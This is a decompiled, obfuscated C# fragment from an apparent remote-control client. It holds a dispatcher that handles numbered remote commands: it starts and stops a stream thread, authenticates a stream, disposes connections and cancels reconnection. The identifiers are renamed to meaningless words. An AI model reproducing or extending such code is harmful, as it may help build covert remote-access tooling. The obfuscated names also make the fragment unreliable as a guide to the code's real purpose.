using System;
using System.Runtime.CompilerServices;
using System.Threading;
using RemoteClient;
using RemoteClient.Consumers;
using RemoteClient.Mappers;
using RemoteClient.Polices;
using RemoteClient.Schemes;
using sdfsdf.Dictionaries;

namespace sdfsdf.Queues
{
	// Token: 0x0200002D RID: 45
	internal class Customer
	{
		// Token: 0x060000CC RID: 204 RVA: 0x00005D00 File Offset: 0x00003F00
		public static void InstantiateMapper(object item, object pred)
		{
			if (pred != null)
			{
				switch (((Method.Client)pred).CompareGetter())
				{
				case 1:
				{
					SchemaMapper.ReflectContext("stream start received");
					byte utils = ((Method.VisitorSpecificationQueue)pred).m_Utils;
					item.streamClass.StopStream = false;
					Customer.m_Printer = new Thread(new ParameterizedThreadStart(item.streamClass.WaitReq));
					Customer.m_Printer.Start(utils);
					SchemaMapper.ReflectContext("stream started succces");
					break;
				}
				case 2:
					item.streamClass.StopStream = true;
					break;
				case 3:
					Parser.InsertContext((Method.ModelInterpreterModel)pred);
					break;
				case 4:
					Parser.AddContext((Method.DispatcherParserResolver)pred);
					break;
				case 5:
				{
					Customer.Struct @struct = new Customer.Struct();
					@struct.merchant = ((Method.TestSpecificationQueue)pred)._PredicateMapper;
					new Thread(new ThreadStart(@struct.ListMapper)).Start();
					break;
				}
				case 6:
					Program.needReconnect = false;
					Product.tests.Dispose();
					break;
				case 8:
					item.AuthStream();
					break;
				case 9:
				{
					string parserMapper = ((Method.ObserverAlgoListener)pred).m_ParserMapper;
					MapperProductSchema.mapper = parserMapper;
					Product.tests.Dispose();
					break;
				}
				}
			}
			pred = null;
			GC.Collect();
		}

		// Token: 0x060000CD RID: 205 RVA: 0x00002297 File Offset: 0x00000497
		public Customer()
		{
			InvocationProcessPolicy.CompareError();
			base..ctor();
		}

		// Token: 0x04000093 RID: 147
		private static Thread m_Printer;

		// Token: 0x0200002E RID: 46
		[CompilerGenerated]
		private sealed class Struct
		{
			// Token: 0x060000CE RID: 206 RVA: 0x00002297 File Offset: 0x00000497
			public Struct()
			{
				InvocationProcessPolicy.CompareError();
				base..ctor();
			}

			// Token: 0x060000CF RID: 207 RVA: 0x00005E48 File Offset: 0x00004048
			internal void ListMapper()
			{
				try
				{
					SchemaMapper.RemoveContext(this.merchant);
				}
				catch
				{
				}
			}

			// Token: 0x04000094 RID: 148
			public byte merchant;
		}
	}
}
